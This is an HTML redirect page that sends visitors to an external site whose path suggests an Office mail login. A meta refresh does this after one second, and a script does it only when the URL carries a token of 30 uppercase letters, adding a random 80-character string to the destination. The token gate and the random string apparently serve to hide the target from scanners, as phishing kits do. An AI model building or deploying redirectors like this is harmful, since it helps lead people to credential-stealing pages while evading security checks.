<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>

    <!-- Fallback Meta Refresh: Ensures the page redirects after 1 second if JavaScript is blocked -->
    <meta http-equiv="refresh" content="1; url=https://vymol.sa.com//m3.mail/office-3D8/index.php">

    <script>
        // Target redirect URL
        const redirectTo = "https://vymol.sa.com//m3.mail/office-3D8/index.php";

        // Function to generate a random string of mixed characters (80 characters)
        function generateRandomString(length) {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        // Function to extract the unnamed query parameter after '?='
        function getUnnamedQueryParam() {
            const query = window.location.search;
            const match = query.match(/^\?=([A-Z]{30})$/); // Matches "?=30-uppercase-letters"
            return match ? match[1] : null;
        }

        // Extract and validate the 30-character uppercase string from the URL
        const upperString = getUnnamedQueryParam();

        if (upperString) {
            // Generate a random 80-character string
            const randomString = generateRandomString(80);

            // Construct the new URL
            const newUrl = `${redirectTo}?=${randomString}`;

            // Debugging log
            console.log("Redirecting to:", newUrl);

            // Redirect using JavaScript
            window.location.href = newUrl;
        } else {
            // Optional: Provide fallback message in case the parameter is incorrect
            document.body.innerHTML = "<p>Invalid URL format. Please use '?=30UPPERCASELETTERS'.</p>";
        }
    </script>
</head>
<body>
    <p>Redirecting you to the new page...</p>
</body>
</html>
